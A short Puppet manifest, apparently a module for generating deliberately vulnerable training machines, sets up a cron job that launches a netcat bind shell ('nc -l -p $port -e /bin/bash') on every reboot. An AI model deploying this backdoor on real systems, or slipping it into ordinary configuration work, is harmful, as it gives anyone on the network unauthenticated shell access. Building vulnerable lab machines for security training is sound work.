class nc_backdoor::install {
  # package { 'nc':
  #   ensure => installed
  # }

  $secgen_parameters = secgen_functions::get_parameters($::base64_inputs_file)
  $port = $secgen_parameters['port'][0]

  # run on each boot via cron
  cron { 'backdoor':
    command     => "nc -l -p $port -e /bin/bash",
    special     => 'reboot',
  }
}
